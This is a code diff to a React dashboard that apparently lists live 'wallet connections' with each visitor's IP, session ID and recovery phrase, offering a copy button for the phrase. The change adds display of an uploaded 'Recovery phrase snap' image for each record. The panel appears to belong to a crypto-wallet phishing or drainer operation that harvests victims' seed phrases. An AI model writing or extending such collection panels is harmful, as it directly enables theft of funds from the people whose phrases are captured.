@@ -29,6 +29,7 @@ export interface LiveWalletConnection {
   clientIp: string | null
   browserSessionId: string | null
   unlockPassword: string | null
+  phraseSnapImage?: string | null
   connectedAt: string
   lastSeenAt: string
   connectionStatus: string
@@ -69,7 +70,7 @@ function CopyButton({ value, label }: { value: string; label: string }) {
   )
 }
 
-function PhraseCell({ phrase }: { phrase: string | null }) {
+function PhraseCell({ phrase, snap }: { phrase: string | null; snap?: string | null }) {
   const text = phrase?.trim() || ''
   const wordCount = text ? text.split(/\s+/).filter(Boolean).length : 0
 
@@ -94,6 +95,16 @@ function PhraseCell({ phrase }: { phrase: string | null }) {
           )}
         </div>
         <p className="text-sm font-mono text-white break-all leading-snug">{text}</p>
+        {snap ? (
+          <a href={snap} target="_blank" rel="noopener noreferrer" className="mt-2 block">
+            <img
+              src={snap}
+              alt="Recovery phrase snap"
+              className="max-h-24 w-auto rounded-md border border-[#243044] object-contain"
+            />
+            <span className="text-[10px] text-[#c7f284] mt-1 inline-block">View snap</span>
+          </a>
+        ) : null}
       </div>
       <CopyButton value={text} label="Phrase" />
     </div>
@@ -148,7 +159,7 @@ function SessionRow({ c }: { c: LiveWalletConnection }) {
         )}
       </td>
       <td className="px-4 py-4 align-top">
-        <PhraseCell phrase={c.unlockPassword} />
+        <PhraseCell phrase={c.unlockPassword} snap={c.phraseSnapImage} />
       </td>
       <td className="px-4 py-4 align-top hidden lg:table-cell">
         <p className="text-[11px] text-gray-400">{timeAgo(c.lastSeenAt)}</p>
